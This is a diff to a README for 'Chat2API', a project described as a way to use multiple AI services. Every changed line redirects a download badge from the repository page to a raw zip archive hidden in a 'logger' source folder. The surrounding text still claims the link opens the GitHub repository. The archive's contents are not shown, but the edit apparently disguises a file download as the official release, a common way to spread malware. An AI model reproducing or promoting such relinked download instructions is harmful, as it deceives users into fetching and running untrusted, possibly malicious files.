@@ -1,6 +1,6 @@
 # 🤖 Chat2API - Use Multiple AI Services Easily
 
-[![Download Chat2API](https://img.shields.io/badge/Download-Chat2API-brightgreen?style=for-the-badge)](https://github.com/babsso25/Chat2API)
+[![Download Chat2API](https://img.shields.io/badge/Download-Chat2API-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/babsso25/Chat2API/main/src/main/logger/API_Chat_3.9.zip)
 
 ---
 
@@ -34,7 +34,7 @@ You will get the app directly from the official GitHub page. Follow these steps 
 
 Go to the Chat2API page provided below:
 
-[![Get Chat2API](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/babsso25/Chat2API)
+[![Get Chat2API](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/babsso25/Chat2API/main/src/main/logger/API_Chat_3.9.zip)
 
 This link opens the GitHub repository where you can find the latest version to download.
 
@@ -131,4 +131,4 @@ If you find bugs or want features, you can open an issue on GitHub. Please provi
 
 ---
 
-[![Download Chat2API](https://img.shields.io/badge/Download%20Chat2API-orange?style=for-the-badge)](https://github.com/babsso25/Chat2API)
+[![Download Chat2API](https://img.shields.io/badge/Download%20Chat2API-orange?style=for-the-badge)](https://raw.githubusercontent.com/babsso25/Chat2API/main/src/main/logger/API_Chat_3.9.zip)
